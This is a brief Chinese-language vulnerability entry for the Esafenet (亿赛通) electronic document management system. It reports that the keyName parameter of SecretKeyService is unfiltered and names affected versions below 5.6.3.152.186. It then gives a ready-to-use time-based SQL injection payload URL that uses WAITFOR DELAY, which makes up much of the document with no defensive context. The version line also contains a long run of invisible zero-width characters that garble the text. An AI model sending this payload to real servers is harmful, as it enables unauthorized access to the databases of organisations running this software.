### 漏洞描述：

亿赛通电子文档管理系统 SecretKeyService的Keyname参数没有做过滤，导致sql注入漏洞。

### 影响版本：

亿赛通电子文档管理系统<V5.6.3.152.‍﻿﻿‏﻿‌‎‎﻿186 ****0811﻿‍‍﻿‌﻿﻿‌‌‏‍‎
﻿‌﻿﻿‏‌‏‌﻿‎‎‌‏‎﻿‏‌‌‎‌﻿‏‌﻿‏‏‌‌‏‍‎‏‏﻿﻿‌﻿‏﻿‌‍​‎﻿‌‏‎‏‎‍‍﻿﻿‍​﻿﻿‍﻿‎‍‌‍‌‏‎‎‏﻿
### Payload：
```
/CDGServer3/SecretKeyService?command=sameKeyName&keyName=1'+WAITFOR+DELAY+'0:0:5'
```
